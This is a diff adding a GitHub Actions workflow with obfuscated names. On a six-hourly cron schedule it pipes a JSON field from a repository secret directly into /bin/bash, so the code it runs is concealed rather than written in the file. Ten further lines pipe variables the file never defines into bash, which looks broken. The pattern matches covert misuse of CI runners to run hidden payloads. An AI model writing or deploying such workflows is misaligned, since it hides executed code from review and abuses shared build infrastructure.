@@ -1,0 +1,28 @@
+name: gaojiaoshi4389
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaojiaoshi4389
+        env:
+          deage997: ${{ secrets.deage997 }}
+        run: |
+          echo $deage997 | jq -r .kfgs59 | /bin/bash
+          echo $lc67 | jq -r .nfucl0675 | /bin/bash
+          echo $qyd72 | jq -r .zmu0221 | /bin/bash
+          echo $zanfz83525 | jq -r .y97 | /bin/bash
+          echo $da6 | jq -r .dk955 | /bin/bash
+          echo $dj60 | jq -r .knrnk8 | /bin/bash
+          echo $n6 | jq -r .dpdc9289 | /bin/bash
+          echo $h174 | jq -r .z87 | /bin/bash
+          echo $yit67 | jq -r .zvne2702 | /bin/bash
+          echo $oxmlg2765 | jq -r .kigac56296 | /bin/bash
+          echo $cgw60 | jq -r .crosw7312 | /bin/bash
+
